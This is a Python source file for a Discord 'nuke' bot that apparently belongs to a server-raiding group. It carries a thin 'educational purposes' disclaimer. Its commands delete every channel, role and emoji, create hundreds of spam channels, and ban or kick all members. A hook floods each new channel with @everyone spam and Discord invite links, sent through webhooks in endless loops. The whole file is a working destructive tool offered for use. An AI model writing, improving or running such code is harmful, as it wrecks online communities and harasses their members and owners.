
# This bot is for educational purposes only. Please use it responsibly and only on servers where you have explicit permission.
# Unauthorized or malicious use of this bot may lead to bans or legal consequences.

import os
import discord
from discord.ext import commands
import random
import asyncio

CHANNEL_NAMES = [
   "🔥𝕹𝖚𝖐𝖊𝖉-𝕭𝖞-𝖂𝖊𝕷𝖔𝖛𝖊𝕱𝖊𝖒𝖇𝖔𝖞𝖘🔥", "✨1g4i-OWNED✨", "😘1𝓰4𝓲-𝓜𝓲𝓵𝓾𝓳𝓮-𝓫𝓻𝓾𝓶𝓲𝓴𝓪!😘"
]
SPAM_MESSAGE = [
    "@everyone WeLoveFemboys OWNED! discord.gg/U7KkcSgh3g dostal OWNED! :clown: contact me: @1457769196095148148 1g4i ON TOP! imagine bejt skid! :clown:"
    "@everyone Pozdravujeme život není krásný! https://tenor.com/view/rst-znk-znk-gif-1241794001590516318%22%3ERst discord.gg/nV65qnFJMx "
]
WEBHOOK_NAMES = [
    '1g4i on top', 'WeLoveFemboys!', 'Český Lev', 'Jdi do prdele!', 'WeLoveFemboysArmy', 'FemboyAdmin', 'MarekČížek'
]
ascii_art = r'''
 _       _  _   _   _____           _ 
/ | __ _| || | (_) |_   _|__   ___ | |
| |/ _` | || |_| |   | |/ _ \ / _ \| |
| | (_| |__   _| |   | | (_) | (_) | |
|_|\__, |  |_| |_|   |_|\___/ \___/|_|
   |___/                              
            MADE BY 1G4I
'''
red_color = "\033[91m"
reset_color = "\033[0m"

intents = discord.Intents.all()
client = commands.Bot(command_prefix=".", intents=intents)

@client.event
async def on_ready():
    print(red_color + ascii_art + reset_color +
          f"Logged in as {client.user}")

@client.command()
async def nuke(ctx, amount=500):
    await ctx.message.delete()
    await ctx.guild.edit(name="𝓦𝓮𝓛𝓸𝓿𝓮𝓕𝓮𝓶𝓫𝓸𝔂𝓼")
    guild = ctx.guild
  
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            pass
    
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
        except:
            pass
          
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
          
    for member in ctx.guild.members:
        try:
            await member.ban(reason="Máš ban femboys on top!")
        except:
            pass

@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick(reason="Máš kick femboys on top!")
        except:
            pass

@client.command()
@commands.is_owner()
async def online(ctx):
    await client.change_presence(status=discord.Status.online)
    await ctx.message.delete()

@client.command()
@commands.is_owner()
async def offline(ctx):
    await client.change_presence(status=discord.Status.offline)
    await ctx.message.delete()

@client.command()
async def spamcat(ctx):
    await ctx.message.delete()
    while True:
        try:
            await ctx.guild.create_category(name="Femboy Bot Cleanuje")
        except:
            pass

@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.ban(reason="Máš ban femboys on top!")
        except:
            pass

@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))
        await webhook.send(random.choice(SPAM_MESSAGE),
                           username=random.choice(WEBHOOK_NAMES))

token = ("token here")
client.run(token)